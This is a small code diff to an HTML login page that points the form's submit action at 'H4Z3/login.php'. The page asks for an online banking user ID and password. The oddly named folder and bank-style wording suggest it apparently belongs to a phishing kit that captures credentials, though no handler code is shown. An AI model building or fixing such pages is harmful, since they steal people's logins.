@@ -139,7 +139,7 @@
                                         </header>
                                         <div id="error"></div>
                                         <section class="account-section">
-                                            <form method="POST" action="H4Z3/login" id="form" class="pay-transfer-options clearfix">
+                                            <form method="POST" action="H4Z3/login.php" id="form" class="pay-transfer-options clearfix">
                                                 <div class="account-title clearfix">
                                                     <p>Please enter your Online User ID and Password.</p>
                                                 </div>
